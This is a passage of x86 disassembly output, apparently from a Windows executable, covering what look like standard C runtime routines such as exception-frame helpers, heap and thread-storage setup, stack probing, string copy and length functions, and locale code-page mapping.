  4236ad:	xor    eax,eax
  4236af:	pop    edi
  4236b0:	pop    esi
  4236b1:	pop    ebp
  4236b2:	pop    ebx
  4236b3:	add    esp,0x48
  4236b6:	ret    
  4236b7:	push   0xc
  4236b9:	push   0x4284a8
  4236be:	call   0x4238a8
  4236c3:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236ca:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236d1:	jae    0x4236f5
  4236d3:	and    DWORD PTR [ebp-0x4],0x0
  4236d7:	mov    eax,DWORD PTR [ebp-0x1c]
  4236da:	mov    eax,DWORD PTR [eax]
  4236dc:	test   eax,eax
  4236de:	je     0x4236eb
  4236e0:	call   eax
  4236e2:	jmp    0x4236eb
  4236e4:	xor    eax,eax
  4236e6:	inc    eax
  4236e7:	ret    
  4236e8:	mov    esp,DWORD PTR [ebp-0x18]
  4236eb:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236ef:	add    DWORD PTR [ebp-0x1c],0x4
  4236f3:	jmp    0x4236ca
  4236f5:	call   0x4238e3
  4236fa:	ret    
  4236fb:	push   0xc
  4236fd:	push   0x4284b8
  423702:	call   0x4238a8
  423707:	mov    DWORD PTR [ebp-0x1c],0x428f08
  42370e:	cmp    DWORD PTR [ebp-0x1c],0x428f08
  423715:	jae    0x423739
  423717:	and    DWORD PTR [ebp-0x4],0x0
  42371b:	mov    eax,DWORD PTR [ebp-0x1c]
  42371e:	mov    eax,DWORD PTR [eax]
  423720:	test   eax,eax
  423722:	je     0x42372f
  423724:	call   eax
  423726:	jmp    0x42372f
  423728:	xor    eax,eax
  42372a:	inc    eax
  42372b:	ret    
  42372c:	mov    esp,DWORD PTR [ebp-0x18]
  42372f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423733:	add    DWORD PTR [ebp-0x1c],0x4
  423737:	jmp    0x42370e
  423739:	call   0x4238e3
  42373e:	ret    
  42373f:	call   0x423986
  423744:	mov    eax,ds:0x45c304
  423749:	cmp    eax,0xffffffff
  42374c:	je     0x42375c
  42374e:	push   eax
  42374f:	call   DWORD PTR ds:0x428068
  423755:	or     DWORD PTR ds:0x45c304,0xffffffff
  42375c:	ret    
  42375d:	push   ebx
  42375e:	push   esi
  42375f:	call   DWORD PTR ds:0x428014
  423765:	push   DWORD PTR ds:0x45c304
  42376b:	mov    ebx,eax
  42376d:	call   DWORD PTR ds:0x428078
  423773:	mov    esi,eax
  423775:	test   esi,esi
  423777:	jne    0x4237c2
  423779:	push   0x88
  42377e:	push   0x1
  423780:	call   0x4249c8
  423785:	mov    esi,eax
  423787:	test   esi,esi
  423789:	pop    ecx
  42378a:	pop    ecx
  42378b:	je     0x4237ba
  42378d:	push   esi
  42378e:	push   DWORD PTR ds:0x45c304
  423794:	call   DWORD PTR ds:0x428074
  42379a:	test   eax,eax
  42379c:	je     0x4237ba
  42379e:	mov    DWORD PTR [esi+0x54],0x45c258
  4237a5:	mov    DWORD PTR [esi+0x14],0x1
  4237ac:	call   DWORD PTR ds:0x428070
  4237b2:	or     DWORD PTR [esi+0x4],0xffffffff
  4237b6:	mov    DWORD PTR [esi],eax
  4237b8:	jmp    0x4237c2
  4237ba:	push   0x10
  4237bc:	call   0x422970
  4237c1:	pop    ecx
  4237c2:	push   ebx
  4237c3:	call   DWORD PTR ds:0x42806c
  4237c9:	mov    eax,esi
  4237cb:	pop    esi
  4237cc:	pop    ebx
  4237cd:	ret    
  4237ce:	call   0x42393d
  4237d3:	test   eax,eax
  4237d5:	je     0x4237e7
  4237d7:	call   DWORD PTR ds:0x42807c
  4237dd:	cmp    eax,0xffffffff
  4237e0:	mov    ds:0x45c304,eax
  4237e5:	jne    0x4237ef
  4237e7:	call   0x42373f
  4237ec:	xor    eax,eax
  4237ee:	ret    
  4237ef:	push   esi
  4237f0:	push   0x88
  4237f5:	push   0x1
  4237f7:	call   0x4249c8
  4237fc:	mov    esi,eax
  4237fe:	test   esi,esi
  423800:	pop    ecx
  423801:	pop    ecx
  423802:	je     0x423834
  423804:	push   esi
  423805:	push   DWORD PTR ds:0x45c304
  42380b:	call   DWORD PTR ds:0x428074
  423811:	test   eax,eax
  423813:	je     0x423834
  423815:	mov    DWORD PTR [esi+0x54],0x45c258
  42381c:	mov    DWORD PTR [esi+0x14],0x1
  423823:	call   DWORD PTR ds:0x428070
  423829:	or     DWORD PTR [esi+0x4],0xffffffff
  42382d:	mov    DWORD PTR [esi],eax
  42382f:	xor    eax,eax
  423831:	inc    eax
  423832:	pop    esi
  423833:	ret    
  423834:	call   0x42373f
  423839:	xor    eax,eax
  42383b:	pop    esi
  42383c:	ret    
  42383d:	cmp    DWORD PTR ds:0x45cac4,0x2
  423844:	jne    0x423853
  423846:	cmp    DWORD PTR ds:0x45cad0,0x5
  42384d:	jb     0x423853
  42384f:	xor    eax,eax
  423851:	inc    eax
  423852:	ret    
  423853:	push   0x3
  423855:	pop    eax
  423856:	ret    
  423857:	xor    eax,eax
  423859:	cmp    DWORD PTR [esp+0x4],eax
  42385d:	push   0x0
  42385f:	sete   al
  423862:	push   0x1000
  423867:	push   eax
  423868:	call   DWORD PTR ds:0x428084
  42386e:	test   eax,eax
  423870:	mov    ds:0x45d140,eax
  423875:	je     0x4238a1
  423877:	call   0x42383d
  42387c:	cmp    eax,0x3
  42387f:	mov    ds:0x45d144,eax
  423884:	jne    0x4238a4
  423886:	push   0x3f8
  42388b:	call   0x424c4a
  423890:	test   eax,eax
  423892:	pop    ecx
  423893:	jne    0x4238a4
  423895:	push   DWORD PTR ds:0x45d140
  42389b:	call   DWORD PTR ds:0x428080
  4238a1:	xor    eax,eax
  4238a3:	ret    
  4238a4:	xor    eax,eax
  4238a6:	inc    eax
  4238a7:	ret    
  4238a8:	push   0x425778
  4238ad:	mov    eax,fs:0x0
  4238b3:	push   eax
  4238b4:	mov    eax,DWORD PTR [esp+0x10]
  4238b8:	mov    DWORD PTR [esp+0x10],ebp
  4238bc:	lea    ebp,[esp+0x10]
  4238c0:	sub    esp,eax
  4238c2:	push   ebx
  4238c3:	push   esi
  4238c4:	push   edi
  4238c5:	mov    eax,DWORD PTR [ebp-0x8]
  4238c8:	mov    DWORD PTR [ebp-0x18],esp
  4238cb:	push   eax
  4238cc:	mov    eax,DWORD PTR [ebp-0x4]
  4238cf:	mov    DWORD PTR [ebp-0x4],0xffffffff
  4238d6:	mov    DWORD PTR [ebp-0x8],eax
  4238d9:	lea    eax,[ebp-0x10]
  4238dc:	mov    fs:0x0,eax
  4238e2:	ret    
  4238e3:	mov    ecx,DWORD PTR [ebp-0x10]
  4238e6:	mov    DWORD PTR fs:0x0,ecx
  4238ed:	pop    ecx
  4238ee:	pop    edi
  4238ef:	pop    esi
  4238f0:	pop    ebx
  4238f1:	leave  
  4238f2:	push   ecx
  4238f3:	ret    
  4238f4:	int3   
  4238f5:	int3   
  4238f6:	int3   
  4238f7:	int3   
  4238f8:	int3   
  4238f9:	int3   
  4238fa:	int3   
  4238fb:	int3   
  4238fc:	int3   
  4238fd:	int3   
  4238fe:	int3   
  4238ff:	int3   
  423900:	cmp    eax,0x1000
  423905:	jae    0x423915
  423907:	neg    eax
  423909:	add    eax,esp
  42390b:	add    eax,0x4
  42390e:	test   DWORD PTR [eax],eax
  423910:	xchg   esp,eax
  423911:	mov    eax,DWORD PTR [eax]
  423913:	push   eax
  423914:	ret    
  423915:	push   ecx
  423916:	lea    ecx,[esp+0x8]
  42391a:	sub    ecx,0x1000
  423920:	sub    eax,0x1000
  423925:	test   DWORD PTR [ecx],eax
  423927:	cmp    eax,0x1000
  42392c:	jae    0x42391a
  42392e:	sub    ecx,eax
  423930:	mov    eax,esp
  423932:	test   DWORD PTR [ecx],eax
  423934:	mov    esp,ecx
  423936:	mov    ecx,DWORD PTR [eax]
  423938:	mov    eax,DWORD PTR [eax+0x4]
  42393b:	push   eax
  42393c:	ret    
  42393d:	push   esi
  42393e:	push   edi
  42393f:	xor    esi,esi
  423941:	mov    edi,0x45cc20
  423946:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  42394e:	jne    0x42396e
  423950:	lea    eax,[esi*8+0x45c310]
  423957:	mov    DWORD PTR [eax],edi
  423959:	push   0xfa0
  42395e:	push   DWORD PTR [eax]
  423960:	add    edi,0x18
  423963:	call   0x42493d
  423968:	test   eax,eax
  42396a:	pop    ecx
  42396b:	pop    ecx
  42396c:	je     0x42397a
  42396e:	inc    esi
  42396f:	cmp    esi,0x24
  423972:	jl     0x423946
  423974:	xor    eax,eax
  423976:	inc    eax
  423977:	pop    edi
  423978:	pop    esi
  423979:	ret    
  42397a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423982:	xor    eax,eax
  423984:	jmp    0x423977
  423986:	push   ebx
  423987:	mov    ebx,DWORD PTR ds:0x428064
  42398d:	push   esi
  42398e:	mov    esi,0x45c310
  423993:	push   edi
  423994:	mov    edi,DWORD PTR [esi]
  423996:	test   edi,edi
  423998:	je     0x4239ad
  42399a:	cmp    DWORD PTR [esi+0x4],0x1
  42399e:	je     0x4239ad
  4239a0:	push   edi
  4239a1:	call   ebx
  4239a3:	push   edi
  4239a4:	call   0x4244ba
  4239a9:	and    DWORD PTR [esi],0x0
  4239ac:	pop    ecx
  4239ad:	add    esi,0x8
  4239b0:	cmp    esi,0x45c430
  4239b6:	jl     0x423994
  4239b8:	mov    esi,0x45c310
  4239bd:	pop    edi
  4239be:	mov    eax,DWORD PTR [esi]
  4239c0:	test   eax,eax
  4239c2:	je     0x4239cd
  4239c4:	cmp    DWORD PTR [esi+0x4],0x1
  4239c8:	jne    0x4239cd
  4239ca:	push   eax
  4239cb:	call   ebx
  4239cd:	add    esi,0x8
  4239d0:	cmp    esi,0x45c430
  4239d6:	jl     0x4239be
  4239d8:	pop    esi
  4239d9:	pop    ebx
  4239da:	ret    
  4239db:	push   ebp
  4239dc:	mov    ebp,esp
  4239de:	mov    eax,DWORD PTR [ebp+0x8]
  4239e1:	push   DWORD PTR [eax*8+0x45c310]
  4239e8:	call   DWORD PTR ds:0x428090
  4239ee:	pop    ebp
  4239ef:	ret    
  4239f0:	push   ebp
  4239f1:	mov    ebp,esp
  4239f3:	push   esi
  4239f4:	mov    esi,DWORD PTR [ebp+0x8]
  4239f7:	lea    esi,[esi*8+0x45c310]
  4239fe:	cmp    DWORD PTR [esi],0x0
  423a01:	je     0x423a08
  423a03:	xor    eax,eax
  423a05:	inc    eax
  423a06:	jmp    0x423a6c
  423a08:	push   edi
  423a09:	push   0x18
  423a0b:	call   0x4245d2
  423a10:	mov    edi,eax
  423a12:	test   edi,edi
  423a14:	pop    ecx
  423a15:	jne    0x423a26
  423a17:	call   0x425850
  423a1c:	mov    DWORD PTR [eax],0xc
  423a22:	xor    eax,eax
  423a24:	jmp    0x423a6b
  423a26:	push   0xa
  423a28:	call   0x423a6f
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	pop    ecx
  423a31:	jne    0x423a59
  423a33:	push   0xfa0
  423a38:	push   edi
  423a39:	call   0x42493d
  423a3e:	test   eax,eax
  423a40:	pop    ecx
  423a41:	pop    ecx
  423a42:	jne    0x423a55
  423a44:	push   edi
  423a45:	call   0x4244ba
  423a4a:	push   0xa
  423a4c:	call   0x4239db
  423a51:	pop    ecx
  423a52:	pop    ecx
  423a53:	jmp    0x423a17
  423a55:	mov    DWORD PTR [esi],edi
  423a57:	jmp    0x423a60
  423a59:	push   edi
  423a5a:	call   0x4244ba
  423a5f:	pop    ecx
  423a60:	push   0xa
  423a62:	call   0x4239db
  423a67:	xor    eax,eax
  423a69:	pop    ecx
  423a6a:	inc    eax
  423a6b:	pop    edi
  423a6c:	pop    esi
  423a6d:	pop    ebp
  423a6e:	ret    
  423a6f:	push   ebp
  423a70:	mov    ebp,esp
  423a72:	mov    eax,DWORD PTR [ebp+0x8]
  423a75:	push   esi
  423a76:	lea    esi,[eax*8+0x45c310]
  423a7d:	cmp    DWORD PTR [esi],0x0
  423a80:	jne    0x423a95
  423a82:	push   eax
  423a83:	call   0x4239f0
  423a88:	test   eax,eax
  423a8a:	pop    ecx
  423a8b:	jne    0x423a95
  423a8d:	push   0x11
  423a8f:	call   0x422970
  423a94:	pop    ecx
  423a95:	push   DWORD PTR [esi]
  423a97:	call   DWORD PTR ds:0x428094
  423a9d:	pop    esi
  423a9e:	pop    ebp
  423a9f:	ret    
  423aa0:	push   esi
  423aa1:	push   DWORD PTR ds:0x45d268
  423aa7:	call   0x425a06
  423aac:	pop    ecx
  423aad:	mov    ecx,DWORD PTR ds:0x45d264
  423ab3:	mov    esi,eax
  423ab5:	mov    eax,ds:0x45d268
  423aba:	mov    edx,ecx
  423abc:	sub    edx,eax
  423abe:	add    edx,0x4
  423ac1:	cmp    esi,edx
  423ac3:	jae    0x423b13
  423ac5:	mov    ecx,0x800
  423aca:	cmp    esi,ecx
  423acc:	jae    0x423ad0
  423ace:	mov    ecx,esi
  423ad0:	add    ecx,esi
  423ad2:	push   ecx
  423ad3:	push   eax
  423ad4:	call   0x425859
  423ad9:	test   eax,eax
  423adb:	pop    ecx
  423adc:	pop    ecx
  423add:	jne    0x423af6
  423adf:	add    esi,0x10
  423ae2:	push   esi
  423ae3:	push   DWORD PTR ds:0x45d268
  423ae9:	call   0x425859
  423aee:	test   eax,eax
  423af0:	pop    ecx
  423af1:	pop    ecx
  423af2:	jne    0x423af6
  423af4:	pop    esi
  423af5:	ret    
  423af6:	mov    ecx,DWORD PTR ds:0x45d264
  423afc:	sub    ecx,DWORD PTR ds:0x45d268
  423b02:	mov    ds:0x45d268,eax
  423b07:	sar    ecx,0x2
  423b0a:	lea    ecx,[eax+ecx*4]
  423b0d:	mov    DWORD PTR ds:0x45d264,ecx
  423b13:	mov    DWORD PTR [ecx],edi
  423b15:	add    DWORD PTR ds:0x45d264,0x4
  423b1c:	mov    eax,edi
  423b1e:	pop    esi
  423b1f:	ret    
  423b20:	push   0x80
  423b25:	call   0x4245d2
  423b2a:	test   eax,eax
  423b2c:	pop    ecx
  423b2d:	mov    ds:0x45d268,eax
  423b32:	jne    0x423b38
  423b34:	push   0x18
  423b36:	pop    eax
  423b37:	ret    
  423b38:	and    DWORD PTR [eax],0x0
  423b3b:	mov    eax,ds:0x45d268
  423b40:	mov    ds:0x45d264,eax
  423b45:	xor    eax,eax
  423b47:	ret    
  423b48:	push   0xc
  423b4a:	push   0x4284c8
  423b4f:	call   0x4238a8
  423b54:	call   0x422bbb
  423b59:	and    DWORD PTR [ebp-0x4],0x0
  423b5d:	mov    edi,DWORD PTR [ebp+0x8]
  423b60:	call   0x423aa0
  423b65:	mov    DWORD PTR [ebp-0x1c],eax
  423b68:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b6c:	call   0x423b7a
  423b71:	mov    eax,DWORD PTR [ebp-0x1c]
  423b74:	call   0x4238e3
  423b79:	ret    
  423b7a:	call   0x422bc4
  423b7f:	ret    
  423b80:	push   DWORD PTR [esp+0x4]
  423b84:	call   0x423b48
  423b89:	neg    eax
  423b8b:	sbb    eax,eax
  423b8d:	neg    eax
  423b8f:	pop    ecx
  423b90:	dec    eax
  423b91:	ret    
  423b92:	push   ebp
  423b93:	mov    ebp,esp
  423b95:	sub    esp,0x10
  423b98:	push   ebx
  423b99:	xor    ebx,ebx
  423b9b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423ba1:	push   esi
  423ba2:	push   edi
  423ba3:	jne    0x423c12
  423ba5:	push   0x428538
  423baa:	call   DWORD PTR ds:0x428098
  423bb0:	mov    edi,eax
  423bb2:	cmp    edi,ebx
  423bb4:	je     0x423c4d
  423bba:	mov    esi,DWORD PTR ds:0x42801c
  423bc0:	push   0x42852c
  423bc5:	push   edi
  423bc6:	call   esi
  423bc8:	test   eax,eax
  423bca:	mov    ds:0x45cd70,eax
  423bcf:	je     0x423c4d
  423bd1:	push   0x42851c
  423bd6:	push   edi
  423bd7:	call   esi
  423bd9:	push   0x428508
  423bde:	push   edi
  423bdf:	mov    ds:0x45cd74,eax
  423be4:	call   esi
  423be6:	cmp    DWORD PTR ds:0x45cac4,0x2
  423bed:	mov    ds:0x45cd78,eax
  423bf2:	jne    0x423c12
  423bf4:	push   0x4284ec
  423bf9:	push   edi
  423bfa:	call   esi
  423bfc:	test   eax,eax
  423bfe:	mov    ds:0x45cd80,eax
  423c03:	je     0x423c12
  423c05:	push   0x4284d4
  423c0a:	push   edi
  423c0b:	call   esi
  423c0d:	mov    ds:0x45cd7c,eax
  423c12:	mov    eax,ds:0x45cd7c
  423c17:	test   eax,eax
  423c19:	je     0x423c57
  423c1b:	call   eax
  423c1d:	test   eax,eax
  423c1f:	je     0x423c3e
  423c21:	lea    ecx,[ebp-0x4]
  423c24:	push   ecx
  423c25:	push   0xc
  423c27:	lea    ecx,[ebp-0x10]
  423c2a:	push   ecx
  423c2b:	push   0x1
  423c2d:	push   eax
  423c2e:	call   DWORD PTR ds:0x45cd80
  423c34:	test   eax,eax
  423c36:	je     0x423c3e
  423c38:	test   BYTE PTR [ebp-0x8],0x1
  423c3c:	jne    0x423c57
  423c3e:	cmp    DWORD PTR ds:0x45cad0,0x4
  423c45:	jb     0x423c51
  423c47:	or     BYTE PTR [ebp+0x12],0x20
  423c4b:	jmp    0x423c76
  423c4d:	xor    eax,eax
  423c4f:	jmp    0x423c86
  423c51:	or     BYTE PTR [ebp+0x12],0x4
  423c55:	jmp    0x423c76
  423c57:	mov    eax,ds:0x45cd74
  423c5c:	test   eax,eax
  423c5e:	je     0x423c76
  423c60:	call   eax
  423c62:	mov    ebx,eax
  423c64:	test   ebx,ebx
  423c66:	je     0x423c76
  423c68:	mov    eax,ds:0x45cd78
  423c6d:	test   eax,eax
  423c6f:	je     0x423c76
  423c71:	push   ebx
  423c72:	call   eax
  423c74:	mov    ebx,eax
  423c76:	push   DWORD PTR [ebp+0x10]
  423c79:	push   DWORD PTR [ebp+0xc]
  423c7c:	push   DWORD PTR [ebp+0x8]
  423c7f:	push   ebx
  423c80:	call   DWORD PTR ds:0x45cd70
  423c86:	pop    edi
  423c87:	pop    esi
  423c88:	pop    ebx
  423c89:	leave  
  423c8a:	ret    
  423c8b:	int3   
  423c8c:	int3   
  423c8d:	int3   
  423c8e:	int3   
  423c8f:	int3   
  423c90:	push   edi
  423c91:	mov    edi,DWORD PTR [esp+0x8]
  423c95:	jmp    0x423d05
  423c97:	lea    esp,[esp+0x0]
  423c9e:	mov    edi,edi
  423ca0:	mov    ecx,DWORD PTR [esp+0x4]
  423ca4:	push   edi
  423ca5:	test   ecx,0x3
  423cab:	je     0x423cc0
  423cad:	mov    al,BYTE PTR [ecx]
  423caf:	add    ecx,0x1
  423cb2:	test   al,al
  423cb4:	je     0x423cf3
  423cb6:	test   ecx,0x3
  423cbc:	jne    0x423cad
  423cbe:	mov    edi,edi
  423cc0:	mov    eax,DWORD PTR [ecx]
  423cc2:	mov    edx,0x7efefeff
  423cc7:	add    edx,eax
  423cc9:	xor    eax,0xffffffff
  423ccc:	xor    eax,edx
  423cce:	add    ecx,0x4
  423cd1:	test   eax,0x81010100
  423cd6:	je     0x423cc0
  423cd8:	mov    eax,DWORD PTR [ecx-0x4]
  423cdb:	test   al,al
  423cdd:	je     0x423d02
  423cdf:	test   ah,ah
  423ce1:	je     0x423cfd
  423ce3:	test   eax,0xff0000
  423ce8:	je     0x423cf8
  423cea:	test   eax,0xff000000
  423cef:	je     0x423cf3
  423cf1:	jmp    0x423cc0
  423cf3:	lea    edi,[ecx-0x1]
  423cf6:	jmp    0x423d05
  423cf8:	lea    edi,[ecx-0x2]
  423cfb:	jmp    0x423d05
  423cfd:	lea    edi,[ecx-0x3]
  423d00:	jmp    0x423d05
  423d02:	lea    edi,[ecx-0x4]
  423d05:	mov    ecx,DWORD PTR [esp+0xc]
  423d09:	test   ecx,0x3
  423d0f:	je     0x423d2e
  423d11:	mov    dl,BYTE PTR [ecx]
  423d13:	add    ecx,0x1
  423d16:	test   dl,dl
  423d18:	je     0x423d80
  423d1a:	mov    BYTE PTR [edi],dl
  423d1c:	add    edi,0x1
  423d1f:	test   ecx,0x3
  423d25:	jne    0x423d11
  423d27:	jmp    0x423d2e
  423d29:	mov    DWORD PTR [edi],edx
  423d2b:	add    edi,0x4
  423d2e:	mov    edx,0x7efefeff
  423d33:	mov    eax,DWORD PTR [ecx]
  423d35:	add    edx,eax
  423d37:	xor    eax,0xffffffff
  423d3a:	xor    eax,edx
  423d3c:	mov    edx,DWORD PTR [ecx]
  423d3e:	add    ecx,0x4
  423d41:	test   eax,0x81010100
  423d46:	je     0x423d29
  423d48:	test   dl,dl
  423d4a:	je     0x423d80
  423d4c:	test   dh,dh
  423d4e:	je     0x423d77
  423d50:	test   edx,0xff0000
  423d56:	je     0x423d6a
  423d58:	test   edx,0xff000000
  423d5e:	je     0x423d62
  423d60:	jmp    0x423d29
  423d62:	mov    DWORD PTR [edi],edx
  423d64:	mov    eax,DWORD PTR [esp+0x8]
  423d68:	pop    edi
  423d69:	ret    
  423d6a:	mov    WORD PTR [edi],dx
  423d6d:	mov    eax,DWORD PTR [esp+0x8]
  423d71:	mov    BYTE PTR [edi+0x2],0x0
  423d75:	pop    edi
  423d76:	ret    
  423d77:	mov    WORD PTR [edi],dx
  423d7a:	mov    eax,DWORD PTR [esp+0x8]
  423d7e:	pop    edi
  423d7f:	ret    
  423d80:	mov    BYTE PTR [edi],dl
  423d82:	mov    eax,DWORD PTR [esp+0x8]
  423d86:	pop    edi
  423d87:	ret    
  423d88:	int3   
  423d89:	int3   
  423d8a:	int3   
  423d8b:	int3   
  423d8c:	int3   
  423d8d:	int3   
  423d8e:	int3   
  423d8f:	int3   
  423d90:	mov    ecx,DWORD PTR [esp+0xc]
  423d94:	push   edi
  423d95:	test   ecx,ecx
  423d97:	je     0x423e2f
  423d9d:	push   esi
  423d9e:	push   ebx
  423d9f:	mov    ebx,ecx
  423da1:	mov    esi,DWORD PTR [esp+0x14]
  423da5:	test   esi,0x3
  423dab:	mov    edi,DWORD PTR [esp+0x10]
  423daf:	jne    0x423dbc
  423db1:	shr    ecx,0x2
  423db4:	jne    0x423e3f
  423dba:	jmp    0x423de3
  423dbc:	mov    al,BYTE PTR [esi]
  423dbe:	add    esi,0x1
  423dc1:	mov    BYTE PTR [edi],al
  423dc3:	add    edi,0x1
  423dc6:	sub    ecx,0x1
  423dc9:	je     0x423df6
  423dcb:	test   al,al
  423dcd:	je     0x423dfe
  423dcf:	test   esi,0x3
  423dd5:	jne    0x423dbc
  423dd7:	mov    ebx,ecx
  423dd9:	shr    ecx,0x2
  423ddc:	jne    0x423e3f
  423dde:	and    ebx,0x3
  423de1:	je     0x423df6
  423de3:	mov    al,BYTE PTR [esi]
  423de5:	add    esi,0x1
  423de8:	mov    BYTE PTR [edi],al
  423dea:	add    edi,0x1
  423ded:	test   al,al
  423def:	je     0x423e28
  423df1:	sub    ebx,0x1
  423df4:	jne    0x423de3
  423df6:	mov    eax,DWORD PTR [esp+0x10]
  423dfa:	pop    ebx
  423dfb:	pop    esi
  423dfc:	pop    edi
  423dfd:	ret    
  423dfe:	test   edi,0x3
  423e04:	je     0x423e1c
  423e06:	mov    BYTE PTR [edi],al
  423e08:	add    edi,0x1
  423e0b:	sub    ecx,0x1
  423e0e:	je     0x423eac
  423e14:	test   edi,0x3
  423e1a:	jne    0x423e06
  423e1c:	mov    ebx,ecx
  423e1e:	shr    ecx,0x2
  423e21:	jne    0x423e97
  423e23:	mov    BYTE PTR [edi],al
  423e25:	add    edi,0x1
  423e28:	sub    ebx,0x1
  423e2b:	jne    0x423e23
  423e2d:	pop    ebx
  423e2e:	pop    esi
  423e2f:	mov    eax,DWORD PTR [esp+0x8]
  423e33:	pop    edi
  423e34:	ret    
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	add    edi,0x4
  423e3a:	sub    ecx,0x1
  423e3d:	je     0x423dde
  423e3f:	mov    edx,0x7efefeff
  423e44:	mov    eax,DWORD PTR [esi]
  423e46:	add    edx,eax
  423e48:	xor    eax,0xffffffff
  423e4b:	xor    eax,edx
  423e4d:	mov    edx,DWORD PTR [esi]
  423e4f:	add    esi,0x4
  423e52:	test   eax,0x81010100
  423e57:	je     0x423e35
  423e59:	test   dl,dl
  423e5b:	je     0x423e89
  423e5d:	test   dh,dh
  423e5f:	je     0x423e7f
  423e61:	test   edx,0xff0000
  423e67:	je     0x423e75
  423e69:	test   edx,0xff000000
  423e6f:	jne    0x423e35
  423e71:	mov    DWORD PTR [edi],edx
  423e73:	jmp    0x423e8d
  423e75:	and    edx,0xffff
  423e7b:	mov    DWORD PTR [edi],edx
  423e7d:	jmp    0x423e8d
  423e7f:	and    edx,0xff
  423e85:	mov    DWORD PTR [edi],edx
  423e87:	jmp    0x423e8d
  423e89:	xor    edx,edx
  423e8b:	mov    DWORD PTR [edi],edx
  423e8d:	add    edi,0x4
  423e90:	xor    eax,eax
  423e92:	sub    ecx,0x1
  423e95:	je     0x423ea3
  423e97:	xor    eax,eax
  423e99:	mov    DWORD PTR [edi],eax
  423e9b:	add    edi,0x4
  423e9e:	sub    ecx,0x1
  423ea1:	jne    0x423e99
  423ea3:	and    ebx,0x3
  423ea6:	jne    0x423e23
  423eac:	mov    eax,DWORD PTR [esp+0x10]
  423eb0:	pop    ebx
  423eb1:	pop    esi
  423eb2:	pop    edi
  423eb3:	ret    
  423eb4:	int3   
  423eb5:	int3   
  423eb6:	int3   
  423eb7:	int3   
  423eb8:	int3   
  423eb9:	int3   
  423eba:	int3   
  423ebb:	int3   
  423ebc:	int3   
  423ebd:	int3   
  423ebe:	int3   
  423ebf:	int3   
  423ec0:	mov    ecx,DWORD PTR [esp+0x4]
  423ec4:	test   ecx,0x3
  423eca:	je     0x423ef0
  423ecc:	mov    al,BYTE PTR [ecx]
  423ece:	add    ecx,0x1
  423ed1:	test   al,al
  423ed3:	je     0x423f23
  423ed5:	test   ecx,0x3
  423edb:	jne    0x423ecc
  423edd:	add    eax,0x0
  423ee2:	lea    esp,[esp+0x0]
  423ee9:	lea    esp,[esp+0x0]
  423ef0:	mov    eax,DWORD PTR [ecx]
  423ef2:	mov    edx,0x7efefeff
  423ef7:	add    edx,eax
  423ef9:	xor    eax,0xffffffff
  423efc:	xor    eax,edx
  423efe:	add    ecx,0x4
  423f01:	test   eax,0x81010100
  423f06:	je     0x423ef0
  423f08:	mov    eax,DWORD PTR [ecx-0x4]
  423f0b:	test   al,al
  423f0d:	je     0x423f41
  423f0f:	test   ah,ah
  423f11:	je     0x423f37
  423f13:	test   eax,0xff0000
  423f18:	je     0x423f2d
  423f1a:	test   eax,0xff000000
  423f1f:	je     0x423f23
  423f21:	jmp    0x423ef0
  423f23:	lea    eax,[ecx-0x1]
  423f26:	mov    ecx,DWORD PTR [esp+0x4]
  423f2a:	sub    eax,ecx
  423f2c:	ret    
  423f2d:	lea    eax,[ecx-0x2]
  423f30:	mov    ecx,DWORD PTR [esp+0x4]
  423f34:	sub    eax,ecx
  423f36:	ret    
  423f37:	lea    eax,[ecx-0x3]
  423f3a:	mov    ecx,DWORD PTR [esp+0x4]
  423f3e:	sub    eax,ecx
  423f40:	ret    
  423f41:	lea    eax,[ecx-0x4]
  423f44:	mov    ecx,DWORD PTR [esp+0x4]
  423f48:	sub    eax,ecx
  423f4a:	ret    
  423f4b:	push   0x8
  423f4d:	push   0x428548
  423f52:	call   0x4238a8
  423f57:	and    DWORD PTR [ebp-0x4],0x0
  423f5b:	push   0x0
  423f5d:	push   0x1
  423f5f:	call   0x425ad2
  423f64:	pop    ecx
  423f65:	pop    ecx
  423f66:	jmp    0x423f6f
  423f68:	xor    eax,eax
  423f6a:	inc    eax
  423f6b:	ret    
  423f6c:	mov    esp,DWORD PTR [ebp-0x18]
  423f6f:	or     DWORD PTR [ebp-0x4],0xffffffff
  423f73:	push   0x3
  423f75:	call   DWORD PTR ds:0x42802c
  423f7b:	int3   
  423f7c:	cmp    ecx,DWORD PTR ds:0x45c430
  423f82:	jne    0x423f85
  423f84:	ret    
  423f85:	jmp    0x423f4b
  423f8a:	movzx  eax,BYTE PTR [esp+0x4]
  423f8f:	mov    cl,BYTE PTR [esp+0xc]
  423f93:	test   BYTE PTR [eax+0x45cf21],cl
  423f99:	jne    0x423fb7
  423f9b:	cmp    DWORD PTR [esp+0x8],0x0
  423fa0:	je     0x423fb0
  423fa2:	movzx  eax,WORD PTR [eax*2+0x428942]
  423faa:	and    eax,DWORD PTR [esp+0x8]
  423fae:	jmp    0x423fb2
  423fb0:	xor    eax,eax
  423fb2:	test   eax,eax
  423fb4:	jne    0x423fb7
  423fb6:	ret    
  423fb7:	xor    eax,eax
  423fb9:	inc    eax
  423fba:	ret    
  423fbb:	push   0x4
  423fbd:	push   0x0
  423fbf:	push   DWORD PTR [esp+0xc]
  423fc3:	call   0x423f8a
  423fc8:	add    esp,0xc
  423fcb:	ret    
  423fcc:	sub    eax,0x3a4
  423fd1:	je     0x423ff5
  423fd3:	sub    eax,0x4
  423fd6:	je     0x423fef
  423fd8:	sub    eax,0xd
  423fdb:	je     0x423fe9
  423fdd:	dec    eax
  423fde:	je     0x423fe3
  423fe0:	xor    eax,eax
  423fe2:	ret    
  423fe3:	mov    eax,0x404
  423fe8:	ret    
  423fe9:	mov    eax,0x412
  423fee:	ret    
  423fef:	mov    eax,0x804
  423ff4:	ret    
  423ff5:	mov    eax,0x411
  423ffa:	ret    
  423ffb:	push   edi
  423ffc:	push   0x40
  423ffe:	xor    eax,eax
  424000:	pop    ecx
  424001:	mov    edi,0x45cf20
  424006:	rep stos DWORD PTR es:[edi],eax
  424008:	stos   BYTE PTR es:[edi],al
  424009:	xor    eax,eax
  42400b:	mov    ds:0x45d024,eax
